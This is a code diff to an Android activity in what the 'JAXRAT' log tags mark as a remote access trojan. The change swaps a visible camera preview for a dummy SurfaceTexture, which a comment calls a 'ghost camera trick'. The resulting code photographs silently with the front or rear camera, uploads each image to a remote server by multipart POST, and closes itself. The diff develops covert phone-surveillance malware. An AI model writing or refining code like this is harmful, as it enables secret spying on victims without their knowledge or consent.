@@ -2,14 +2,12 @@ package com.ezax.agent;
 
 import android.Manifest;
 import android.content.pm.PackageManager;
+import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
-import android.view.SurfaceHolder;
-import android.view.SurfaceView;
-import android.widget.FrameLayout;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import java.io.*;
@@ -25,29 +23,13 @@ public class CameraActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Bikin SurfaceView transparan buat pancingan biar kamera mau jalan
-        FrameLayout layout = new FrameLayout(this);
-        SurfaceView surfaceView = new SurfaceView(this);
-        layout.addView(surfaceView);
-        setContentView(layout);
-
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("JAXRAT", "Izin kamera ditolak!");
             finish(); return;
         }
 
         isFront = getIntent().getBooleanExtra("FRONT", false);
 
-        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
-            @Override
-            public void surfaceCreated(SurfaceHolder holder) {
-                startCamera(holder);
-            }
-            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
-            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
-        });
-    }
-
-    private void startCamera(SurfaceHolder holder) {
         try {
             Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
             int cameraCount = Camera.getNumberOfCameras();
@@ -64,19 +46,27 @@ public class CameraActivity extends AppCompatActivity {
             }
 
             camera = Camera.open(cameraId);
-            camera.setPreviewDisplay(holder);
+            
+            // TRIK KAMERA HANTU: Pakai SurfaceTexture bohongan (ID 10)
+            SurfaceTexture dummySurface = new SurfaceTexture(10);
+            camera.setPreviewTexture(dummySurface);
             camera.startPreview();
 
-            // Jeda dikit biar autofokus nyesuaiin
+            // Jeda 1.5 detik biar kamera siap (fokus & exposure)
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                camera.takePicture(null, null, (data, cam) -> {
-                    uploadImage(data);
-                });
-            }, 1000);
+                try {
+                    camera.takePicture(null, null, (data, cam) -> {
+                        uploadImage(data);
+                    });
+                } catch (Exception e) {
+                    Log.e("JAXRAT", "Gagal ambil foto", e);
+                    finish();
+                }
+            }, 1500);
 
         } catch (Exception e) {
-            Log.e("JAXRAT", "Kamera Error", e);
-            finish();
+            Log.e("JAXRAT", "Kamera Error Total", e);
+            finish(); // Tutup layar kalau kamera gagal dibuka
         }
     }
 
@@ -89,6 +79,7 @@ public class CameraActivity extends AppCompatActivity {
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
+                conn.setConnectTimeout(5000); // Timeout 5 detik
                 String boundary = "***";
                 conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
 
@@ -101,7 +92,9 @@ public class CameraActivity extends AppCompatActivity {
 
                 int responseCode = conn.getResponseCode();
                 Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
-            } catch (Exception e) { Log.e("JAXRAT", "Upload Error", e); }
+            } catch (Exception e) { 
+                Log.e("JAXRAT", "Upload Error", e); 
+            }
             
             runOnUiThread(this::finish);
         }).start();
@@ -111,8 +104,10 @@ public class CameraActivity extends AppCompatActivity {
     protected void onDestroy() {
         super.onDestroy();
         if (camera != null) {
-            camera.stopPreview();
-            camera.release();
+            try {
+                camera.stopPreview();
+                camera.release();
+            } catch (Exception e) {}
             camera = null;
         }
     }
